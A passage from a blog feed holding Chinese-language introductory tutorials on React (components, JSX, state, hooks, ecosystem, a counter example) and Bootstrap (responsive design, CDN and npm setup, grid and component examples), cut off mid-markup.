        <content type="html"><![CDATA[<h1 id="一、React简介"><a href="#一、React简介" class="headerlink" title="一、React简介"></a>一、React简介</h1><p><strong>React</strong> 是由 <strong>Meta（前 Facebook）</strong> 开发并开源的一个用于构建用户界面的 <strong>JavaScript 库</strong>。它主要用于创建单页应用（SPA, Single Page Application），能够通过组件化的开发模式构建复杂的用户界面。</p><h1 id="二、React-的核心特点"><a href="#二、React-的核心特点" class="headerlink" title="二、React 的核心特点"></a>二、React 的核心特点</h1><h2 id="2-1-组件化开发"><a href="#2-1-组件化开发" class="headerlink" title="2.1 组件化开发"></a>2.1 <strong>组件化开发</strong></h2><ul><li>页面由独立、可复用的 <strong>组件（Component）</strong> 组成。</li><li>每个组件可以管理自己的状态，并可以组合形成复杂的 UI。</li></ul><h2 id="2-2-声明式编程"><a href="#2-2-声明式编程" class="headerlink" title="2.2 声明式编程"></a>2.2 <strong>声明式编程</strong></h2><ul><li>使用简单的语法描述 UI 状态，React 根据状态变化自动更新界面。</li><li>代码直观、易于维护。</li></ul><h2 id="2-2-虚拟-DOM（Virtual-DOM）"><a href="#2-2-虚拟-DOM（Virtual-DOM）" class="headerlink" title="2.2 虚拟 DOM（Virtual DOM）"></a>2.2 <strong>虚拟 DOM（Virtual DOM）</strong></h2><ul><li>React 通过虚拟 DOM 实现高效的 UI 更新。</li><li>当状态或属性改变时，React 会计算差异，并仅更新需要更改的部分，而非整个页面。</li></ul><h2 id="2-3-单向数据流"><a href="#2-3-单向数据流" class="headerlink" title="2.3 单向数据流"></a>2.3 <strong>单向数据流</strong></h2><ul><li>数据以单一方向从父组件流向子组件，使得数据管理清晰、易于调试。</li></ul><h2 id="2-4-跨平台"><a href="#2-4-跨平台" class="headerlink" title="2.4 跨平台"></a>2.4 <strong>跨平台</strong></h2><ul><li>除了 Web 开发，React 还支持构建原生应用（通过 React Native）。</li></ul><h1 id="三、React-的组成部分"><a href="#三、React-的组成部分" class="headerlink" title="三、React 的组成部分"></a>三、React 的组成部分</h1><h2 id="3-1-组件（Components）"><a href="#3-1-组件（Components）" class="headerlink" title="3.1 组件（Components）"></a>3.1 组件（Components）</h2><p>React 的核心是组件。组件可以是类组件或函数组件。</p><p>示例（函数组件）：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token operator">&lt;</span>h1<span class="token operator">&gt;</span>Hello<span class="token punctuation">,</span> React<span class="token operator">!</span><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">&gt;</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="3-2-JSX（JavaScript-XML）"><a href="#3-2-JSX（JavaScript-XML）" class="headerlink" title="3.2 JSX（JavaScript XML）"></a>3.2 JSX（JavaScript XML）</h2><p>JSX 是 React 的语法扩展，允许在 JavaScript 中直接编写 HTML。</p><p>示例：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> element <span class="token operator">=</span> <span class="token operator">&lt;</span>h1<span class="token operator">&gt;</span>Hello<span class="token punctuation">,</span> <span class="token constant">JSX</span><span class="token operator">!</span><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">&gt;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-3-状态（State）与属性（Props）"><a href="#3-3-状态（State）与属性（Props）" class="headerlink" title="3.3 状态（State）与属性（Props）"></a>3.3 状态（State）与属性（Props）</h2><p><strong>State</strong>：组件内部的数据，组件自身管理。</p><p><strong>Props</strong>：父组件传递给子组件的数据，子组件不能修改。</p><p>示例：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Welcome</span><span class="token punctuation">(</span><span class="token parameter">props</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token operator">&lt;</span>h1<span class="token operator">&gt;</span>Hello<span class="token punctuation">,</span> <span class="token punctuation">{</span>props<span class="token punctuation">.</span>name<span class="token punctuation">}</span><span class="token operator">!</span><span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">&gt;</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="3-4-生命周期（Lifecycle-Methods）"><a href="#3-4-生命周期（Lifecycle-Methods）" class="headerlink" title="3.4 生命周期（Lifecycle Methods）"></a>3.4 生命周期（Lifecycle Methods）</h2><p>类组件提供了生命周期方法（如 <code>componentDidMount</code>、<code>componentDidUpdate</code>）以控制组件的挂载、更新和卸载。</p><p>函数组件中通过 <strong>Hooks</strong>（如 <code>useEffect</code>）实现类似功能。</p><h1 id="四、React-的生态系统"><a href="#四、React-的生态系统" class="headerlink" title="四、React 的生态系统"></a>四、React 的生态系统</h1><p>React 的核心库主要专注于视图层，功能简单而强大。但在实际项目中，往往需要结合其周边工具与框架来构建完整应用。</p><h2 id="4-1-React-Router"><a href="#4-1-React-Router" class="headerlink" title="4.1 React Router"></a>4.1 <strong>React Router</strong></h2><ul><li><p>用于实现单页应用的路由管理。</p></li><li><p>示例：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>Routes<span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>Route path<span class="token operator">=</span><span class="token string">"/"</span> element<span class="token operator">=</span><span class="token punctuation">{</span><span class="token operator">&lt;</span>Home <span class="token operator">/</span><span class="token operator">&gt;</span><span class="token punctuation">}</span> <span class="token operator">/</span><span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>Route path<span class="token operator">=</span><span class="token string">"/about"</span> element<span class="token operator">=</span><span class="token punctuation">{</span><span class="token operator">&lt;</span>About <span class="token operator">/</span><span class="token operator">&gt;</span><span class="token punctuation">}</span> <span class="token operator">/</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>Routes<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="4-2-Redux-MobX-Context-API"><a href="#4-2-Redux-MobX-Context-API" class="headerlink" title="4.2 Redux / MobX / Context API"></a>4.2 <strong>Redux / MobX / Context API</strong></h2><ul><li>用于管理全局状态和数据共享。</li></ul><h2 id="4-3-Next-js-Remix"><a href="#4-3-Next-js-Remix" class="headerlink" title="4.3 Next.js / Remix"></a>4.3 <strong>Next.js / Remix</strong></h2><ul><li>React 的服务端渲染（SSR）框架，用于提升 SEO 和初始加载速度。</li></ul><h2 id="4-4-工具链"><a href="#4-4-工具链" class="headerlink" title="4.4 工具链"></a>4.4 <strong>工具链</strong></h2><ul><li><strong>Create React App（CRA）</strong>：快速初始化 React 项目的脚手架工具。</li><li><strong>Vite</strong>：用于构建更快速的开发环境。</li></ul><h1 id="五、React-示例代码"><a href="#五、React-示例代码" class="headerlink" title="五、React 示例代码"></a>五、React 示例代码</h1><p>以下是一个简单的 React 应用，展示组件、状态管理和事件处理：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> React<span class="token punctuation">,</span> <span class="token punctuation">{</span> useState <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> <span class="token punctuation">[</span>count<span class="token punctuation">,</span> setCount<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>        <span class="token operator">&lt;</span>div<span class="token operator">&gt;</span>            <span class="token operator">&lt;</span>h1<span class="token operator">&gt;</span>React 计数器<span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">&gt;</span>            <span class="token operator">&lt;</span>p<span class="token operator">&gt;</span>当前计数：<span class="token punctuation">{</span>count<span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span>            <span class="token operator">&lt;</span>button onClick<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">setCount</span><span class="token punctuation">(</span>count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">&gt;</span>增加<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>            <span class="token operator">&lt;</span>button onClick<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">setCount</span><span class="token punctuation">(</span>count <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token operator">&gt;</span>减少<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>        <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>运行效果：</strong></p><ul><li>初始状态显示计数为 <code>0</code>。</li><li>点击“增加”按钮，计数递增。</li><li>点击“减少”按钮，计数递减。</li></ul><h1 id="六、优缺点"><a href="#六、优缺点" class="headerlink" title="六、优缺点"></a>六、优缺点</h1><h2 id="6-1-优点"><a href="#6-1-优点" class="headerlink" title="6.1 优点"></a>6.1 优点</h2><p><strong>高效</strong>：虚拟 DOM 提高了渲染效率。</p><p><strong>灵活</strong>：可以与任何后端或前端框架（如 Redux、GraphQL）结合使用。</p><p><strong>生态系统丰富</strong>：有大量的库和工具支持。</p><p><strong>活跃的社区</strong>：庞大的开发者社区，解决方案和教程丰富。</p><h2 id="6-2-缺点"><a href="#6-2-缺点" class="headerlink" title="6.2 缺点"></a>6.2 缺点</h2><p><strong>学习曲线较陡</strong>：需要学习 JSX、Hooks、状态管理等概念。</p><p><strong>频繁更新</strong>：React 生态系统更新迅速，新手可能感到难以跟上。</p><p><strong>仅关注视图层</strong>：构建完整应用需要引入额外工具（如路由、状态管理）。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>React 是现代前端开发中最流行的工具之一，凭借其高效的虚拟 DOM、组件化开发模式和强大的生态系统，成为构建用户界面的首选技术。无论是中小型项目还是复杂的大型应用，React 都能提供优雅的解决方案。</p>]]></content>
      
      
      <categories>
          
          <category> 前后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端开发 </tag>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bootstrap</title>
      <link href="/2024/12/09/qian-hou-duan-kai-fa/bootstrap/"/>
      <url>/2024/12/09/qian-hou-duan-kai-fa/bootstrap/</url>
      
        <content type="html"><![CDATA[<h1 id="一、Bootstrap-简介"><a href="#一、Bootstrap-简介" class="headerlink" title="一、Bootstrap 简介"></a>一、Bootstrap 简介</h1><p><strong>Bootstrap</strong> 是一个功能强大、响应式、开源的前端框架，用于快速开发现代化网站和 Web 应用程序。它由 Twitter 的 Mark Otto 和 Jacob Thornton 创建，最初发布于 2011 年，目前由社区和开发者积极维护。</p><h1 id="二、核心特点"><a href="#二、核心特点" class="headerlink" title="二、核心特点"></a>二、核心特点</h1><h2 id="2-1-响应式设计"><a href="#2-1-响应式设计" class="headerlink" title="2.1 响应式设计"></a>2.1 <strong>响应式设计</strong></h2><p>Bootstrap 提供了基于 <strong>12 列网格系统</strong> 的布局工具，使页面能够适配不同尺寸的屏幕设备（如手机、平板、桌面）。</p><blockquote><ul><li><h3 id="何为响应式设计？"><a href="#何为响应式设计？" class="headerlink" title="何为响应式设计？"></a>何为响应式设计？</h3></li></ul><p><strong>响应式设计</strong>（Responsive Web Design，简称 RWD）是一种 Web 开发技术，旨在使网页能够根据用户设备的屏幕大小、分辨率和方向自动调整布局和内容，从而提供一致且友好的用户体验。</p><p>响应式设计的目标是<strong>一套代码适配多种设备</strong>，无论用户使用的是桌面、平板还是手机，页面都能清晰易用，避免缩放、横向滚动等不便。</p><h3 id="响应式设计的特点"><a href="#响应式设计的特点" class="headerlink" title="响应式设计的特点"></a>响应式设计的特点</h3><ol><li><strong>自动适配屏幕尺寸</strong><ul><li>页面布局、字体大小、图片比例等会根据设备变化自动调整。</li></ul></li><li><strong>提升用户体验</strong><ul><li>无需用户手动缩放或横向滚动，内容更易读、操作更便捷。</li></ul></li><li><strong>节省开发时间</strong><ul><li>相较于为每种设备开发单独的页面，响应式设计一次开发即可适配多端。</li></ul></li></ol></blockquote><blockquote><ul><li><h3 id="何为SEO？"><a href="#何为SEO？" class="headerlink" title="何为SEO？"></a>何为SEO？</h3></li></ul><p><strong>SEO</strong> 是 <strong>Search Engine Optimization</strong> 的缩写，中文称为<strong>搜索引擎优化</strong>。它是一种通过优化网站内容、结构和外部链接等方式，提高网站在搜索引擎中的排名，从而增加网站自然流量的技术和策略。</p><p>SEO 的目标是让网站更容易被搜索引擎抓取、理解和推荐，从而在用户搜索相关关键词时，能优先展示在搜索结果页面（SERP，Search Engine Results Page）靠前的位置。</p></blockquote><h2 id="2-2-预制样式和组件"><a href="#2-2-预制样式和组件" class="headerlink" title="2.2 预制样式和组件"></a>2.2 <strong>预制样式和组件</strong></h2><p>内置大量预制样式和 UI 组件，能快速构建现代化页面：</p><ul><li>常见的 CSS 样式：按钮、表单、排版等。</li><li>UI 组件：导航栏、模态框、卡片、标签页等。</li></ul><h2 id="2-3-移动优先"><a href="#2-3-移动优先" class="headerlink" title="2.3 移动优先"></a>2.3 <strong>移动优先</strong></h2><p>默认采用“移动优先”设计理念，确保页面在移动设备上的体验优先，同时适配更大的屏幕。</p><h2 id="2-4-强大的扩展能力"><a href="#2-4-强大的扩展能力" class="headerlink" title="2.4 强大的扩展能力"></a>2.4 <strong>强大的扩展能力</strong></h2><p>支持自定义和扩展，开发者可以在其基础上开发自己的样式或功能。</p><h2 id="2-5-基于-HTML、CSS-和-JavaScript"><a href="#2-5-基于-HTML、CSS-和-JavaScript" class="headerlink" title="2.5 基于 HTML、CSS 和 JavaScript"></a>2.5 <strong>基于 HTML、CSS 和 JavaScript</strong></h2><p>Bootstrap 提供的功能主要基于 HTML 和 CSS，同时也内置了许多交互功能，依赖于其自带的 JavaScript 或 jQuery。</p><h2 id="2-6-丰富的文档"><a href="#2-6-丰富的文档" class="headerlink" title="2.6 丰富的文档"></a>2.6 <strong>丰富的文档</strong></h2><p>Bootstrap 的文档详细、易懂，提供大量示例代码和用法说明，便于开发者快速上手。</p><h1 id="三、使用方法"><a href="#三、使用方法" class="headerlink" title="三、使用方法"></a>三、使用方法</h1><h2 id="3-1-引入方式"><a href="#3-1-引入方式" class="headerlink" title="3.1 引入方式"></a>3.1 <strong>引入方式</strong></h2><p>Bootstrap 提供了多种方式来引入，包括 CDN 和本地安装。</p><p><strong>通过 CDN 引入</strong>：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Bootstrap 示例<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!-- 引入 Bootstrap CSS --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>通过 npm 安装</strong>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> bootstrap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-2-基本示例"><a href="#3-2-基本示例" class="headerlink" title="3.2 基本示例"></a>3.2 <strong>基本示例</strong></h2><p><strong>创建一个响应式页面布局</strong>：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Bootstrap 网格示例<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>row<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-md-4<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>列 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-md-4<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>列 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-md-4<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>列 3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="四、常见的组件示例"><a href="#四、常见的组件示例" class="headerlink" title="四、常见的组件示例"></a>四、常见的组件示例</h1><h2 id="4-1-按钮"><a href="#4-1-按钮" class="headerlink" title="4.1 按钮"></a>4.1 按钮</h2><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-primary<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>主按钮<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-secondary<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>次按钮<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="4-2-导航栏"><a href="#4-2-导航栏" class="headerlink" title="4.2 导航栏"></a>4.2 导航栏</h2><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nav</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar navbar-expand-lg navbar-light bg-light<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container-fluid<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar-brand<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Logo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar-toggler<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">data-bs-toggle</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>collapse<span class="token punctuation">"</span></span> <span class="token attr-name">data-bs-target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#navbarNav<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar-toggler-icon<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>collapse navbar-collapse<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbarNav<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar-nav<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav-item<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav-link active<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>主页<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav-item<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav-link<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>功能<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span 